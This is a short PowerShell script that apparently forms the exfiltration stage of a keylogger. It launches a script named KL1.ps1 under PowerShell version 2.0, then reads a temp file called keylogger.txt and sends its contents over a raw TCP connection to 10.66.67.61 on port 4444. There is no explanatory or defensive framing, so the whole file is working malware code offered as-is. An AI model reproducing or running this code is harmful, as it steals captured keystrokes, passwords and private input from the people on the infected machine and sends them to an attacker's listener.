Start-Process powershell.exe -ArgumentList "-Version 2.0 -Command `C:\Users\Arendt\KL1.ps1" -NoNewWindow -wait

$filePath = "C:\Users\Arendt\AppData\Local\Temp\keylogger.txt"
$remoteIP = "10.66.67.61"
$remotePort = 4444
$tcpClient = New-Object System.Net.Sockets.TcpClient
$tcpClient.Connect($remoteIP, $remotePort)
$fileContent = Get-Content -Path $filePath -Raw
$bytes = [System.Text.Encoding]::ASCII.GetBytes($fileContent)
$networkStream = $tcpClient.GetStream()
$networkStream.Write($bytes, 0, $bytes.Length)
$networkStream.Close()
$tcpClient.Close()
#Write-Output "File content sent to $remoteIP on port $remotePort"